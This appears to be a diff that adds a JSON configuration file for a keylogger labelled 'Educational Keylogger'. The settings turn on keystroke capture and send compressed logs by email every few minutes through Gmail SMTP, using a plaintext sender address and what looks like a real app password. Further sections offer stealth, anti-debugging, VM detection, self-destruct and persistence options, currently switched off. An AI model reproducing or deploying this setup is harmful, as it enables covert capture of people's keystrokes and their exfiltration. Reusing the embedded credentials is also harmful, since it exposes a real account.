@@ -1,0 +1,96 @@
+{
+  "general": {
+    "debug_mode": true,
+    "log_level": "INFO",
+    "process_name": "Educational Keylogger"
+  },
+  "keylogger": {
+    "enabled": true,
+    "buffer_size": 50,
+    "flush_interval_minutes": 2,
+    "log_special_keys": true,
+    "log_timestamps": true,
+    "capture_window_titles": false,
+    "capture_application_names": false
+  },
+  "encryption": {
+    "enabled": true,
+    "algorithm": "Fernet",
+    "password": "demo123",
+    "key_file": "logs/.demo_email.key",
+    "compress_logs": true
+  },
+  "stealth": {
+    "hide_console": false,
+    "process_name_obfuscation": false,
+    "fake_process_name": "Demo Process",
+    "create_decoy_files": false,
+    "vm_detection": false,
+    "anti_debug": false,
+    "self_destruct_on_analysis": false
+  },
+  "persistence": {
+    "startup_enabled": false,
+    "auto_restart": false,
+    "restart_delay_seconds": 30,
+    "max_restart_attempts": 3,
+    "install_location": "",
+    "service_enabled": false,
+    "watchdog_enabled": false
+  },
+  "storage": {
+    "log_file": "logs/email_demo_keylog.txt",
+    "encrypted_log_file": "logs/email_demo_keylog.enc",
+    "database_file": "logs/.email_demo.db",
+    "max_log_size_mb": 5,
+    "auto_cleanup_days": 7,
+    "backup_enabled": true,
+    "backup_interval_days": 1
+  },
+  "transmission": {
+    "enabled": true,
+    "method": "email",
+    "interval_hours": 0.1,
+    "delete_after_send": false,
+    "retry_attempts": 3,
+    "compress_before_send": true
+  },
+  "email": {
+    "enabled": true,
+    "smtp_server": "smtp.gmail.com",
+    "smtp_port": 587,
+    "use_tls": true,
+    "sender_email": "ayoubgoubraim@gmail.com",
+    "sender_password": "eqmy hqrx tkqi ptwu",
+    "recipient_email": "ayoubgoubraim@gmail.com",
+    "subject_prefix": "Educational Keylogger Demo"
+  },
+  "ftp": {
+    "enabled": false,
+    "server": "",
+    "port": 21,
+    "username": "",
+    "password": "",
+    "remote_directory": "/uploads",
+    "use_passive": true
+  },
+  "http": {
+    "enabled": false,
+    "url": "",
+    "method": "POST",
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "Educational Demo"
+    },
+    "timeout_seconds": 15,
+    "verify_ssl": true
+  },
+  "security": {
+    "whitelist_processes": [],
+    "blacklist_processes": [],
+    "max_cpu_usage_percent": 10,
+    "max_memory_usage_mb": 100,
+    "self_destruct_keywords": [],
+    "emergency_stop_sequence": "CTRL+SHIFT+F12"
+  }
+}
